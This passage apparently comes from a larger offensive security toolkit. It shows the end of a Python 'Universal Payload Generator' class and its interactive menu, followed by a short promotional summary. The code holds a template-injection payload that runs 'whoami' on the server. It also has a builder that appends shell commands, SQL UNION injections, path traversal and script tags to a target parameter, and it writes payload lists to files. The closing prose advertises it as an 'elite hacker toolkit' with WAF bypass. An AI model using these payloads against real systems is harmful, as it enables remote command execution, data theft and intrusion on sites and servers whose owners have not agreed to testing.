                "#set($ex=$rt.getRuntime().exec('whoami'))",
                "$ex.waitFor()",
                "#set($out=$ex.getInputStream())",
                "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
            ]
        }
        
        # Flatten all SSTI payloads
        all_ssti = []
        for engine, payloads in ssti_payloads.items():
            all_ssti.extend(payloads)
        
        self.payloads['ssti'] = all_ssti
        return self.payloads['ssti']
    
    def generate_all_payloads(self):
        """Generate all payload types"""
        print("🔥 Generating Universal Payloads...")
        
        self.generate_xss_payloads()
        print(f"✅ XSS payloads: {len(self.payloads['xss'])}")
        
        self.generate_sqli_payloads()
        print(f"✅ SQL injection payloads: {len(self.payloads['sqli'])}")
        
        self.generate_ssrf_payloads()
        print(f"✅ SSRF payloads: {len(self.payloads['ssrf'])}")
        
        self.generate_lfi_payloads()
        print(f"✅ LFI payloads: {len(self.payloads['lfi'])}")
        
        self.generate_rce_payloads()
        print(f"✅ RCE payloads: {len(self.payloads['rce'])}")
        
        self.generate_xxe_payloads()
        print(f"✅ XXE payloads: {len(self.payloads['xxe'])}")
        
        self.generate_ssti_payloads()
        print(f"✅ SSTI payloads: {len(self.payloads['ssti'])}")
        
        return self.payloads
    
    def save_payloads_to_files(self, output_dir="payloads"):
        """Save payloads to separate files"""
        import os
        
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        for payload_type, payload_list in self.payloads.items():
            filename = f"{output_dir}/{payload_type}_payloads.txt"
            with open(filename, 'w') as f:
                for payload in payload_list:
                    f.write(payload + '
')
            print(f"💾 Saved {len(payload_list)} {payload_type.upper()} payloads to {filename}")
    
    def generate_custom_payload(self, payload_type, target_param, custom_command="whoami"):
        """Generate custom payload for specific parameter"""
        if payload_type == "rce":
            return f"{target_param}; {custom_command}"
        elif payload_type == "xss":
            return f"{target_param}<script>alert('{custom_command}')</script>"
        elif payload_type == "sqli":
            return f"{target_param}' UNION SELECT '{custom_command}'--"
        elif payload_type == "ssrf":
            return f"{target_param}http://127.0.0.1/{custom_command}"
        elif payload_type == "lfi":
            return f"{target_param}../../../{custom_command}"
        else:
            return f"{target_param}{custom_command}"

# Usage
def main():
    generator = UniversalPayloadGenerator()
    
    print("🎯 Universal Payload Generator")
    print("1. Generate all payloads")
    print("2. Generate specific payload type")
    print("3. Generate custom payload")
    
    choice = input("Select option (1-3): ")
    
    if choice == "1":
        payloads = generator.generate_all_payloads()
        generator.save_payloads_to_files()
        
        total_payloads = sum(len(p) for p in payloads.values())
        print(f"
🎉 Generated {total_payloads} total payloads!")
        
    elif choice == "2":
        payload_type = input("Enter payload type (xss/sqli/ssrf/lfi/rce/xxe/ssti): ").lower()
        
        if payload_type == "xss":
            payloads = generator.generate_xss_payloads()
        elif payload_type == "sqli":
            payloads = generator.generate_sqli_payloads()
        elif payload_type == "ssrf":
            payloads = generator.generate_ssrf_payloads()
        elif payload_type == "lfi":
            payloads = generator.generate_lfi_payloads()
        elif payload_type == "rce":
            payloads = generator.generate_rce_payloads()
        elif payload_type == "xxe":
            payloads = generator.generate_xxe_payloads()
        elif payload_type == "ssti":
            payloads = generator.generate_ssti_payloads()
        else:
            print("❌ Invalid payload type")
            return
        
        print(f"
📋 Generated {len(payloads)} {payload_type.upper()} payloads:")
        for i, payload in enumerate(payloads[:10], 1):
            print(f"{i:2d}. {payload}")
        
        if len(payloads) > 10:
            print(f"... and {len(payloads) - 10} more payloads")
            
    elif choice == "3":
        payload_type = input("Enter payload type: ").lower()
        target_param = input("Enter target parameter: ")
        custom_command = input("Enter custom command (optional): ") or "whoami"
        
        custom_payload = generator.generate_custom_payload(payload_type, target_param, custom_command)
        print(f"
🎯 Custom payload: {custom_payload}")

if __name__ == "__main__":
    main()
```

This elite hacker toolkit provides:

1. **Multi-Purpose Reconnaissance Suite** - Comprehensive automated reconnaissance with advanced techniques
2. **Subdomain Takeover Detector** - Automated detection of vulnerable subdomains
3. **Universal Payload Generator** - Comprehensive payload generation for all major attack vectors
4. **Advanced Encoding/Obfuscation** - Multiple encoding techniques for WAF bypass
5. **Parallel Processing** - High-speed scanning with concurrent execution
6. **Professional Reporting** - Detailed reports with actionable findings
7. **Modular Design** - Easy to extend and customize for specific needs

Each tool is designed for professional use by bug bounty hunters and red team operators, with advanced features and comprehensive coverage of attack vectors.
